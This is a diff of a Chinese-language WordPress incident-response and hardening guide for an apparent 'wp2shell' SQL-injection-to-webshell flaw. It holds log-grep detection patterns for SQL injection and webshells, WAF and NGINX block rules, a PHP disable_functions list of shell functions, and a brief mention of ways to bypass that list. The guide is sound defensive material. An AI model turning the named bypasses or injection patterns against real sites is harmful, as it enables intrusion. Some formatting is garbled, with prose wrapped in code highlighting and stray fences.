+<div class="highlight"><pre><span></span><code># /etc/mysql/mysql.conf.d/mysqld.cnf 中启用 general log（注意性能影响）
+</code></pre></div>
+
 <p>[mysqld]
 general_log_file = /var/log/mysql/general.log
 general_log = 1
@@ -583,88 +653,128 @@ log_output = TABLE  # 或者 FILE</p>
 long_query_time = 0  # 记录所有查询（仅临时排查使用）
 slow_query_log_file = /var/log/mysql/slow.log</p>
 <p>查找包含 <code>INTO OUTFILE</code> 的 SQL：</p>
-<p>grep -i "INTO OUTFILE" /var/log/mysql/*.log</p>
+<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;INTO OUTFILE&quot;</span><span class="w"> </span>/var/log/mysql/*.log
+</code></pre></div>
+
 <p><strong>优先级 3：检查 Web 服务器日志</strong></p>
-<h1 id="wp-jsonbatchv1-post">查找对 /wp-json/batch/v1 的 POST 请求</h1>
-<p>grep -E 'POST .*/wp-json/batch/v1' /var/log/apache2/access.log /var/log/nginx/access.log</p>
-<h1 id="sql">查找可能含 SQL 关键字的异常请求</h1>
-<p>grep -i "union.*select" /var/log/apache2/access.log /var/log/nginx/access.log | head -50</p>
-<h1 id="wp-contentuploadsphp">查找对 /wp-content/uploads/*.php 的可疑访问</h1>
-<p>grep -E 'GET .<em>/wp-content/uploads/.</em>.php' /var/log/apache2/access.log /var/log/nginx/access.log</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 查找对 /wp-json/batch/v1 的 POST 请求</span>
+<span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">E</span><span class="w"> </span><span class="s1">&#39;POST .*/wp-json/batch/v1&#39;</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span>
+
+<span class="c1"># 查找可能含 SQL 关键字的异常请求</span>
+<span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="s2">&quot;union.*select&quot;</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">head</span><span class="w"> </span><span class="o">-</span><span class="mi">50</span>
+
+<span class="c1"># 查找对 /wp-content/uploads/*.php 的可疑访问</span>
+<span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">E</span><span class="w"> </span><span class="s1">&#39;GET .*/wp-content/uploads/.*.php&#39;</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span>
+</code></pre></div>
+
 <p><strong>优先级 4：检查 PHP-FPM 错误日志</strong></p>
 <p>tail -1000 /var/log/php-fpm/error.log | grep -iE "warning|error|notice"</p>
 <p><code>WP_Query::parse_query()</code> 在某些版本上面对畸形输入会发出 PHP Notice，这些 Notice 在日志里出现得异常密集时往往是正在被扫描或利用的信号。</p>
 <p><strong>优先级 5：检查可疑临时文件</strong></p>
-<h1 id="tmpvartmp-dropper-reverse-shell">攻击者可能在 /tmp、/var/tmp 留 dropper 或 reverse shell 客户端</h1>
-<p>find /tmp /var/tmp /dev/shm -type f -mtime -7 -ls 2&gt;/dev/null</p>
-<h1 id="cron">检查异常 cron 任务</h1>
-<p>for user in $(cut -f1 -d: /etc/passwd); do
-crontab -l -u "$user" 2&gt;/dev/null | grep -v '^#' &amp;&amp; echo "--- $user"
-done</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 攻击者可能在 /tmp、/var/tmp 留 dropper 或 reverse shell 客户端</span>
+<span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">tmp</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="w"> </span><span class="o">-</span><span class="n">type</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">-</span><span class="n">mtime</span><span class="w"> </span><span class="o">-</span><span class="mi">7</span><span class="w"> </span><span class="o">-</span><span class="n">ls</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="nb nb-Type">null</span>
+
+<span class="c1"># 检查异常 cron 任务</span>
+<span class="k">for</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">$</span><span class="p">(</span><span class="n">cut</span><span class="w"> </span><span class="o">-</span><span class="n">f1</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="p">);</span><span class="w"> </span><span class="n">do</span>
+<span class="n">crontab</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s2">&quot;$user&quot;</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="nb nb-Type">null</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="s1">&#39;^#&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">&quot;--- $user&quot;</span>
+</code></pre></div>
+
+<p>done</p>
 <p><strong>优先级 5：检查 <code>/var/www/html</code> 之外的潜在 webroot</strong></p>
 <p>有些定制化部署把 webroot 放在 <code>/usr/share/nginx/html</code> 或 <code>/srv/www</code>，不是 <code>/var/www/html</code>。如果你的 MySQL 配置里 <code>secure_file_priv</code> 为空且用户有 FILE 权限，攻击者会把 webshell 写到 MySQL 进程能访问的任何位置。</p>
-<h1 id="7-php">全盘查找最近 7 天新创建的 .php 文件（除系统包之外）</h1>
-<p>find / -type f -name "<em>.php" -mtime -7
--not -path "/usr/share/php/</em>"
--not -path "/usr/lib/*"
-2&gt;/dev/null</p>
+<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">全盘查找最近</span><span class="w"> </span><span class="mi">7</span><span class="w"> </span><span class="nx">天新创建的</span><span class="w"> </span><span class="p">.</span><span class="nx">php</span><span class="w"> </span><span class="nx">文件</span><span class="err">（</span><span class="nx">除系统包之外</span><span class="err">）</span>
+<span class="nx">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="k">type</span><span class="w"> </span><span class="nx">f</span><span class="w"> </span><span class="o">-</span><span class="nx">name</span><span class="w"> </span><span class="s">&quot;*.php&quot;</span><span class="w"> </span><span class="o">-</span><span class="nx">mtime</span><span class="w"> </span><span class="o">-</span><span class="mi">7</span><span class="w"> </span>\
+<span class="o">-</span><span class="k">not</span><span class="w"> </span><span class="o">-</span><span class="nx">path</span><span class="w"> </span><span class="s">&quot;/usr/share/php/*&quot;</span><span class="w"> </span>\
+<span class="o">-</span><span class="k">not</span><span class="w"> </span><span class="o">-</span><span class="nx">path</span><span class="w"> </span><span class="s">&quot;/usr/lib/*&quot;</span><span class="w"> </span>\
+</code></pre></div>
+
+<p>2&gt;/dev/null</p>
 <p>3.3 你的应急响应清单（今晚就要做的）</p>
 <p>把上面所有点整合成一个可执行的应急清单。建议你今天晚上就跑一遍：</p>
 <p><strong>优先级 1（立刻）</strong>：更新到修复版本</p>
-<h1 id="wordpress-wp-cli">在 WordPress 后台 → 更新页面，或者用 WP-CLI</h1>
+<div class="highlight"><pre><span></span><code># 在 WordPress 后台 → 更新页面，或者用 WP-CLI
+</code></pre></div>
+
 <p>wp core update——version=6.9.5   # 如果你跑的是 6.9 系列</p>
-<h1 id="_3">或者</h1>
+<div class="highlight"><pre><span></span><code># 或者
+</code></pre></div>
+
 <p>wp core update                   # 拉取当前分支最新版
 wp core update-db</p>
 <p><strong>优先级 2（立刻）</strong>：如果暂时不能更新，在 WAF/NGINX 上阻断 <code>/wp-json/batch/v1</code></p>
-<h1 id="etcnginxconfdwordpress-blockconf">/etc/nginx/conf.d/wordpress-block.conf</h1>
-<p>location ~* /wp-json/batch/v1 {
+<div class="highlight"><pre><span></span><code><span class="gh">#</span> /etc/nginx/conf.d/wordpress-block.conf
+location ~* /wp-json/batch/v1 {
 deny all;
 return 403;
-}</p>
+}
+</code></pre></div>
+
 <p>然后 <code>nginx -s reload</code>。</p>
-<p><strong>优先级 3（30 分钟内）</strong>：检查 MySQL 用户权限——查看 wordpress 用户的权限
-SHOW GRANTS FOR 'wordpress'@'localhost';——撤销 FILE 权限（即使 ALL PRIVILEGES 也得显式 revoke）
-REVOKE FILE ON <em>.</em> FROM 'wordpress'@'localhost';
+<p><strong>优先级 3（30 分钟内）</strong>：检查 MySQL 用户权限——查看 wordpress 用户的权限</p>
+<div class="highlight"><pre><span></span><code><span class="k">SHOW</span><span class="w"> </span><span class="nv">GRANTS</span><span class="w"> </span><span class="k">FOR</span><span class="w"> </span><span class="s1">&#39;wordpress&#39;</span>@<span class="s1">&#39;localhost&#39;</span><span class="c1">;</span>
+
+```——撤销<span class="w"> </span><span class="nv">FILE</span><span class="w"> </span>权限（即使<span class="w"> </span><span class="nv">ALL</span><span class="w"> </span><span class="nv">PRIVILEGES</span><span class="w"> </span>也得显式<span class="w"> </span><span class="nv">revoke</span>）
+</code></pre></div>
+
+<p>REVOKE FILE ON <em>.</em> FROM 'wordpress'@'localhost';
 FLUSH PRIVILEGES;</p>
-<p><strong>注意</strong>：撤销 FILE 权限后 wp2shell 的 <code>INTO OUTFILE</code> 路径就被堵死，但攻击者还能通过 SQL 注入读 <code>wp_users</code> 表。所以这一步只是缩小攻击面，不是完整修复。</p>
-<p>撤销 FILE 权限时还有一个常见的踩坑点：很多 WordPress 教程推荐用 <code>wp-config.php</code> 里加 <code>'DB_CHARSET' =&gt; 'utf8mb4'</code> 等参数，但<strong>没人教你撤销 FILE</strong>。这是一个普遍的安全误区——WordPress 安装文档的\"5 分钟快速入门\"从来没把\"撤销 FILE 权限\"列为必做项。这是 WordPress 文档层面的一个长期欠债，也是 wp2shell 能造成广泛影响的原因之一。</p>
-<p><strong>优先级 4（今晚）</strong>：检查 <code>/wp-content/uploads/</code> 目录的 PHP 执行权限</p>
+<div class="highlight"><pre><span></span><code><span class="o">**</span><span class="n">注意</span><span class="o">**</span><span class="n">：撤销</span><span class="w"> </span><span class="k">FILE</span><span class="w"> </span><span class="n">权限后</span><span class="w"> </span><span class="n">wp2shell</span><span class="w"> </span><span class="n">的</span><span class="w"> </span><span class="n n-Quoted">`INTO OUTFILE`</span><span class="w"> </span><span class="n">路径就被堵死，但攻击者还能通过</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">注入读</span><span class="w"> </span><span class="n n-Quoted">`wp_users`</span><span class="w"> </span><span class="n">表。所以这一步只是缩小攻击面，不是完整修复。</span>
+
+<span class="n">撤销</span><span class="w"> </span><span class="k">FILE</span><span class="w"> </span><span class="n">权限时还有一个常见的踩坑点：很多</span><span class="w"> </span><span class="n">WordPress</span><span class="w"> </span><span class="n">教程推荐用</span><span class="w"> </span><span class="n n-Quoted">`wp-config.php`</span><span class="w"> </span><span class="n">里加</span><span class="w"> </span><span class="n n-Quoted">`&#39;DB_CHARSET&#39; =&gt; &#39;utf8mb4&#39;`</span><span class="w"> </span><span class="n">等参数，但</span><span class="o">**</span><span class="n">没人教你撤销</span><span class="w"> </span><span class="k">FILE</span><span class="o">**</span><span class="n">。这是一个普遍的安全误区——WordPress</span><span class="w"> </span><span class="n">安装文档的</span><span class="err">\</span><span class="s2">&quot;5 分钟快速入门</span><span class="se">\&quot;</span><span class="s2">从来没把</span><span class="se">\&quot;</span><span class="s2">撤销 FILE 权限</span><span class="se">\&quot;</span><span class="s2">列为必做项。这是 WordPress 文档层面的一个长期欠债，也是 wp2shell 能造成广泛影响的原因之一。</span>
+
+<span class="s2">**优先级 4（今晚）**：检查 `/wp-content/uploads/` 目录的 PHP 执行权限</span>
+</code></pre></div>
+
 <h1 id="uploads-php">阻断对 uploads 目录下 .php 的执行</h1>
 <p>location ~<em> /wp-content/uploads/.</em>.php$ {
 deny all;
 }</p>
-<p>或者在 Apache 上：</p>
+<div class="highlight"><pre><span></span><code>或者在 Apache 上：
+</code></pre></div>
+
 <h1 id="htaccess-wp-contentuploads">.htaccess 放在 wp-content/uploads/ 下</h1>
-<p><FilesMatch "\.php$">
-Require all denied
-</FilesMatch></p>
-<p><strong>优先级 5（本周）</strong>：订阅 WordPress 安全公告</p>
-<ul>
-<li>WordPress 官方 mailing list：https://make.wordpress.org/core/</li>
-<li>WPVulnDB：https://wpscan.com/</li>
-<li>Wordfence Intelligence：https://www.wordfence.com/threat-intel/</li>
-<li>关注 \@wpsecurity auf Twitter/X</li>
-</ul>
-<p>把这些信源加进你的 RSS / Slack 频道，下一次类似事件就能更快响应。</p>
-<p>━━━ ━━━ ━━━</p>
-<p>第 4 部分：检测与加固——WAF 规则 + NGINX 配置 + PHP 沙箱</p>
-<p>这一部分我们把第 3 部分提到的应急措施展开成可复制即用的配置。原则是：<strong>临时缓解</strong>（24-48 小时内生效）和<strong>深度加固</strong>（永久性改进）分开，避免把所有鸡蛋放在自动更新这一个篮子里。</p>
-<p>4.1 紧急 WAF 规则（针对 CVE-2026-63030）</p>
-<p><strong>ModSecurity 规则</strong></p>
-<p>如果你在 Apache 或 NGINX 前端跑 ModSecurity，可以加这条规则阻断 <code>/wp-json/batch/v1</code> 的可疑请求：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;FilesMatch</span><span class="w"> </span><span class="err">&quot;\.php$&quot;</span><span class="nt">&gt;</span>
+Require<span class="w"> </span>all<span class="w"> </span>denied
+<span class="nt">&lt;/FilesMatch&gt;</span>
+
+**优先级<span class="w"> </span>5（本周）**：订阅<span class="w"> </span>WordPress<span class="w"> </span>安全公告
+
+-<span class="w">   </span>WordPress<span class="w"> </span>官方<span class="w"> </span>mailing<span class="w"> </span>list：https://make.wordpress.org/core/
+-<span class="w">   </span>WPVulnDB：https://wpscan.com/
+-<span class="w">   </span>Wordfence<span class="w"> </span>Intelligence：https://www.wordfence.com/threat-intel/
+-<span class="w">   </span>关注<span class="w"> </span>\@wpsecurity<span class="w"> </span>auf<span class="w"> </span>Twitter/X
+
+把这些信源加进你的<span class="w"> </span>RSS<span class="w"> </span>/<span class="w"> </span>Slack<span class="w"> </span>频道，下一次类似事件就能更快响应。
+
+━━━<span class="w"> </span>━━━<span class="w"> </span>━━━
+
+第<span class="w"> </span>4<span class="w"> </span>部分：检测与加固——WAF<span class="w"> </span>规则<span class="w"> </span>+<span class="w"> </span>NGINX<span class="w"> </span>配置<span class="w"> </span>+<span class="w"> </span>PHP<span class="w"> </span>沙箱
+
+这一部分我们把第<span class="w"> </span>3<span class="w"> </span>部分提到的应急措施展开成可复制即用的配置。原则是：**临时缓解**（24-48<span class="w"> </span>小时内生效）和**深度加固**（永久性改进）分开，避免把所有鸡蛋放在自动更新这一个篮子里。
+
+4.1<span class="w"> </span>紧急<span class="w"> </span>WAF<span class="w"> </span>规则（针对<span class="w"> </span>CVE-2026-63030）
+
+**ModSecurity<span class="w"> </span>规则**
+
+如果你在<span class="w"> </span>Apache<span class="w"> </span>或<span class="w"> </span>NGINX<span class="w"> </span>前端跑<span class="w"> </span>ModSecurity，可以加这条规则阻断<span class="w"> </span>`/wp-json/batch/v1`<span class="w"> </span>的可疑请求：
+</code></pre></div>
+
 <h1 id="etcmodsecurityowasp-crsruleswp2shellconf">/etc/modsecurity/owasp-crs/rules/wp2shell.conf</h1>
-<p>SecRule REQUEST_URI "@beginsWith /wp-json/batch/v1"
-"id:1001001,
-phase:1,
-deny,
-status:403,
-log,
-msg:'wp2shell CVE-2026-63030 batch route blocked',
-tag:'CVE-2026-63030',
-severity:'CRITICAL'"</p>
-<p>但要注意：<strong>简单阻断整个 batch 路由</strong>会破坏依赖它的合法客户端（极少数，主要是自定义前端）。如果你的站点没有这种客户端，安全起见直接阻断。</p>
-<p><strong>NGINX 配置</strong></p>
+<div class="highlight"><pre><span></span><code><span class="n">SecRule</span><span class="w"> </span><span class="n">REQUEST_URI</span><span class="w"> </span><span class="ss">&quot;@beginsWith /wp-json/batch/v1&quot;</span>
+<span class="ss">&quot;id:1001001,</span>
+<span class="ss">phase:1,</span>
+<span class="ss">deny,</span>
+<span class="ss">status:403,</span>
+<span class="ss">log,</span>
+<span class="ss">msg:&#39;wp2shell CVE-2026-63030 batch route blocked&#39;,</span>
+<span class="ss">tag:&#39;CVE-2026-63030&#39;,</span>
+<span class="ss">severity:&#39;CRITICAL&#39;&quot;</span>
+
+<span class="n">但要注意</span><span class="err">：</span><span class="o">**</span><span class="n">简单阻断整个</span><span class="w"> </span><span class="n">batch</span><span class="w"> </span><span class="n">路由</span><span class="o">**</span><span class="n">会破坏依赖它的合法客户端</span><span class="err">（</span><span class="n">极少数</span><span class="err">，</span><span class="n">主要是自定义前端</span><span class="err">）。</span><span class="n">如果你的站点没有这种客户端</span><span class="err">，</span><span class="n">安全起见直接阻断</span><span class="err">。</span>
+
+<span class="o">**</span><span class="n">NGINX</span><span class="w"> </span><span class="n">配置</span><span class="o">**</span>
+</code></pre></div>
+
 <h1 id="etcnginxconfdwordpress-hardeningconf">/etc/nginx/conf.d/wordpress-hardening.conf</h1>
 <h1 id="wp2shell">阻断 wp2shell 路径</h1>
 <p>location ~* /wp-json/batch/v1 {
@@ -685,7 +795,9 @@ internal;
 deny all;
 return 404;
 }</p>
-<p>完整配置：</p>
+<div class="highlight"><pre><span></span><code>完整配置：
+</code></pre></div>
+
 <p>server {
 listen 80;
 listen [::]:80;
@@ -701,7 +813,7 @@ server_name example.com;</p>
 ssl_certificate_key /etc/ssl/private/example.com.key;</p>
 <p>root /var/www/html;
 index index.php;</p>
-<h1 id="_4">=== 通用安全头 ===</h1>
+<h1 id="_1">=== 通用安全头 ===</h1>
 <p>add_header X-Frame-Options "SAMEORIGIN" always;
 add_header X-Content-Type-Options "nosniff" always;
 add_header Referrer-Policy "strict-origin-when-cross-origin" always;
@@ -724,7 +836,7 @@ try_files $uri $uri/ /index.php?$args;
 include snippets/fastcgi-php.conf;
 fastcgi_pass unix:/run/php/php8.3-fpm.sock;</p>
 <h1 id="php">仅允许特定路径下的 PHP 执行</h1>
-<h1 id="_5">注意：这只是例子，实际需要根据站点结构调整</h1>
+<h1 id="_2">注意：这只是例子，实际需要根据站点结构调整</h1>
 <p>fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
 include fastcgi_params;
 }</p>
@@ -732,65 +844,99 @@ include fastcgi_params;
 deny all;
 }
 }</p>
-<p><strong>Cloudflare WAF 规则</strong></p>
-<p>如果你用 Cloudflare 防护，可以在 WAF 自定义规则里加：</p>
-<ul>
-<li><strong>规则 1（阻断）</strong>：<code>(http.request.uri.path eq "/wp-json/batch/v1")</code> → Block</li>
-<li><strong>规则 2（限速）</strong>：<code>(http.request.uri.path contains "/wp-json/") and (ip.src not in {你的白名单})</code> → Rate limit (10 req / 10s)</li>
-<li><strong>规则 3（监控）</strong>：<code>(http.request.uri.path eq "/wp-json/batch/v1") and (http.request.method eq "POST")</code> → Log only（用于观察是否还有人在尝试）</li>
-</ul>
-<p>如果你的站点在 Cloudflare 后面，还要记得检查 <code>cf-connecting-ip</code> 和 <code>x-forwarded-for</code> 头是否被正确处理——很多 WordPress 部署在反代后面，原始 IP 信息丢失，导致基于 IP 的限速规则失效。一个常见补救措施是在 WordPress 的 <code>wp-config.php</code> 里加上：</p>
+<div class="highlight"><pre><span></span><code>**Cloudflare WAF 规则**
+
+如果你用 Cloudflare 防护，可以在 WAF 自定义规则里加：
+
+<span class="k">-</span>   **规则 1（阻断）**：`(http.request.uri.path eq &quot;/wp-json/batch/v1&quot;)` → Block
+<span class="k">-</span>   **规则 2（限速）**：`(http.request.uri.path contains &quot;/wp-json/&quot;) and (ip.src not in {你的白名单})` → Rate limit (10 req / 10s)
+<span class="k">-</span>   **规则 3（监控）**：`(http.request.uri.path eq &quot;/wp-json/batch/v1&quot;) and (http.request.method eq &quot;POST&quot;)` → Log only（用于观察是否还有人在尝试）
+
+如果你的站点在 Cloudflare 后面，还要记得检查 <span class="sb">`cf-connecting-ip`</span> 和 <span class="sb">`x-forwarded-for`</span> 头是否被正确处理——很多 WordPress 部署在反代后面，原始 IP 信息丢失，导致基于 IP 的限速规则失效。一个常见补救措施是在 WordPress 的 <span class="sb">`wp-config.php`</span> 里加上：
+</code></pre></div>
+
 <p>// 信任 Cloudflare 的 IP 头
 if ( isset( $_SERVER['HTTP_CF_CONNECTING_IP'] ) ) {
 $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
 }</p>
-<p>但这种\"信任上游 IP 头\"的模式本身有风险——如果 Cloudflare 配置错误（比如把 5xx fallback 到 origin），攻击者可能直接通过 IP 头伪造绕过 WAF。生产环境应该在 WAF 层做 IP 校验，而不是依赖 WordPress 自己解析。</p>
-<p>4.2 加固配置示例</p>
-<p>除了阻断 batch 路由，还有几个深度加固方向：</p>
-<p><strong>PHP-FPM 配置加固</strong></p>
+<div class="highlight"><pre><span></span><code>但这种\&quot;信任上游 IP 头\&quot;的模式本身有风险——如果 Cloudflare 配置错误（比如把 5xx fallback 到 origin），攻击者可能直接通过 IP 头伪造绕过 WAF。生产环境应该在 WAF 层做 IP 校验，而不是依赖 WordPress 自己解析。
+
+4.2 加固配置示例
+
+除了阻断 batch 路由，还有几个深度加固方向：
+
+**PHP-FPM 配置加固**
+</code></pre></div>
+
 <h1 id="etcphp83fpmphpini-etcphp83fpmconfdsecurityini">/etc/php/8.3/fpm/php.ini 或 /etc/php/8.3/fpm/conf.d/security.ini</h1>
-<p>; 关闭危险函数（生产环境强烈推荐）
-disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_multi_exec,parse_ini_file,show_source</p>
-<p>; 限制 PHP 能访问的文件系统
-open_basedir = /var/www/html:/tmp:/var/lib/php/sessions</p>
-<p>; 关闭远程文件包含
-allow_url_fopen = Off
-allow_url_include = Off</p>
-<p>; 隐藏 PHP 版本
-expose_php = Off</p>
-<p>; 限制 POST 大小（防止大 payload 攻击）
-post_max_size = 8M
-upload_max_filesize = 8M</p>
-<p><strong>风险提示</strong>：<code>disable_functions</code> 不能完全防御 RCE——攻击者可以用 PHP 的 <code>dl()</code> 加载扩展、用 <code>imap_open()</code> 走 SSRF、用 <code>proc_open</code> 已被禁但 <code>popen</code> 仍在之类组合绕过。但它显著增加了利用成本，是 baseline hardening 的一部分。</p>
-<p>需要强调的是：<code>disable_functions</code> 在 PHP-FPM 模式下可以通过修改 <code>php.ini</code> 立即生效，无需重启进程（前提是 PHP-FPM 配置了 <code>pm.max_requests</code> 之类的进程回收）。但如果 PHP 是以 Apache mod_php 方式运行，<code>disable_functions</code> 的修改需要重启 Apache 才能生效。生产环境配置变更前要先确认 PHP 的运行模式。</p>
-<p><strong>MySQL 加固</strong>——1. 撤销 FILE 权限（即使 ALL PRIVILEGES 也得显式 revoke）
-REVOKE FILE ON <em>.</em> FROM 'wordpress'@'localhost';
-FLUSH PRIVILEGES;——2. 设置 secure_file_priv 为非空目录（强制 OUTFILE 只能写到指定位置）——注意：这需要在 my.cnf 里设置，MySQL 重启后生效——[mysqld]——secure_file_priv = /var/lib/mysql-files/——3. 验证设置
-SHOW VARIABLES LIKE 'secure_file_priv';
-SHOW GRANTS FOR 'wordpress'@'localhost';</p>
+<p>; 关闭危险函数（生产环境强烈推荐）</p>
+<div class="highlight"><pre><span></span><code>disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_multi_exec,parse_ini_file,show_source
+</code></pre></div>
+
+<p>; 限制 PHP 能访问的文件系统</p>
+<div class="highlight"><pre><span></span><code><span class="n">open_basedir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="n">sessions</span>
+</code></pre></div>
+
+<p>; 关闭远程文件包含</p>
+<div class="highlight"><pre><span></span><code>allow_url_fopen = Off
+allow_url_include = Off
+</code></pre></div>
+
+<p>; 隐藏 PHP 版本</p>
+<div class="highlight"><pre><span></span><code>expose_php = Off
+</code></pre></div>
+
+<p>; 限制 POST 大小（防止大 payload 攻击）</p>
+<div class="highlight"><pre><span></span><code><span class="n">post_max_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">8M</span>
+<span class="n">upload_max_filesize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">8M</span>
+
+<span class="o">**</span><span class="n">风险提示</span><span class="o">**</span><span class="n">：</span><span class="n n-Quoted">`disable_functions`</span><span class="w"> </span><span class="n">不能完全防御</span><span class="w"> </span><span class="n">RCE——攻击者可以用</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="n">的</span><span class="w"> </span><span class="n n-Quoted">`dl()`</span><span class="w"> </span><span class="n">加载扩展、用</span><span class="w"> </span><span class="n n-Quoted">`imap_open()`</span><span class="w"> </span><span class="n">走</span><span class="w"> </span><span class="n">SSRF、用</span><span class="w"> </span><span class="n n-Quoted">`proc_open`</span><span class="w"> </span><span class="n">已被禁但</span><span class="w"> </span><span class="n n-Quoted">`popen`</span><span class="w"> </span><span class="n">仍在之类组合绕过。但它显著增加了利用成本，是</span><span class="w"> </span><span class="n">baseline</span><span class="w"> </span><span class="n">hardening</span><span class="w"> </span><span class="n">的一部分。</span>
+
+<span class="n">需要强调的是：</span><span class="n n-Quoted">`disable_functions`</span><span class="w"> </span><span class="n">在</span><span class="w"> </span><span class="n">PHP</span><span class="o">-</span><span class="n">FPM</span><span class="w"> </span><span class="n">模式下可以通过修改</span><span class="w"> </span><span class="n n-Quoted">`php.ini`</span><span class="w"> </span><span class="n">立即生效，无需重启进程（前提是</span><span class="w"> </span><span class="n">PHP</span><span class="o">-</span><span class="n">FPM</span><span class="w"> </span><span class="n">配置了</span><span class="w"> </span><span class="n n-Quoted">`pm.max_requests`</span><span class="w"> </span><span class="n">之类的进程回收）。但如果</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="n">是以</span><span class="w"> </span><span class="n">Apache</span><span class="w"> </span><span class="n">mod_php</span><span class="w"> </span><span class="n">方式运行，</span><span class="n n-Quoted">`disable_functions`</span><span class="w"> </span><span class="n">的修改需要重启</span><span class="w"> </span><span class="n">Apache</span><span class="w"> </span><span class="n">才能生效。生产环境配置变更前要先确认</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="n">的运行模式。</span>
+
+<span class="o">**</span><span class="n">MySQL</span><span class="w"> </span><span class="n">加固</span><span class="o">**</span><span class="n">——1</span><span class="p">.</span><span class="w"> </span><span class="n">撤销</span><span class="w"> </span><span class="k">FILE</span><span class="w"> </span><span class="n">权限（即使</span><span class="w"> </span><span class="k">ALL</span><span class="w"> </span><span class="k">PRIVILEGES</span><span class="w"> </span><span class="n">也得显式</span><span class="w"> </span><span class="k">revoke</span><span class="n">）</span>
+</code></pre></div>
+
+<p>REVOKE FILE ON <em>.</em> FROM 'wordpress'@'localhost';
+FLUSH PRIVILEGES;</p>
+<p>```——2. 设置 secure_file_priv 为非空目录（强制 OUTFILE 只能写到指定位置）——注意：这需要在 my.cnf 里设置，MySQL 重启后生效——[mysqld]——secure_file_priv = /var/lib/mysql-files/——3. 验证设置</p>
+<div class="highlight"><pre><span></span><code>SHOW VARIABLES LIKE &#39;secure_file_priv&#39;;
+SHOW GRANTS FOR &#39;wordpress&#39;@&#39;localhost&#39;;
+</code></pre></div>
+
 <p><strong>文件系统加固</strong></p>
-<h1 id="1-wp-contentuploads-php">① 把 wp-content/uploads/ 设为不可执行（即便 PHP 上传了文件也不能直接执行）</h1>
-<h1 id="nginx-php-fpm">在 NGINX 配置中已经实现，这里补充 PHP-FPM 层面的防护：</h1>
-<p>chown -R www-data:www-data /var/www/html/wp-content/uploads/
-find /var/www/html/wp-content/uploads/ -type d -exec chmod 755 {} \;
-find /var/www/html/wp-content/uploads/ -type f -exec chmod 644 {} \;</p>
-<h1 id="2-wp-configphp-root">② 检查 wp-config.php 的权限（应该只有 root 能写）</h1>
-<p>chmod 440 /var/www/html/wp-config.php
-chown root:www-data /var/www/html/wp-config.php</p>
-<h1 id="3-php-uploads">③ 禁用 PHP 在 uploads 目录的执行（多层防护）</h1>
-<h1 id="a-nginx">a) NGINX 层（已配置）</h1>
-<h1 id="b-apache">b) Apache 层</h1>
-<p>echo '<FilesMatch "\.php$">
-Require all denied
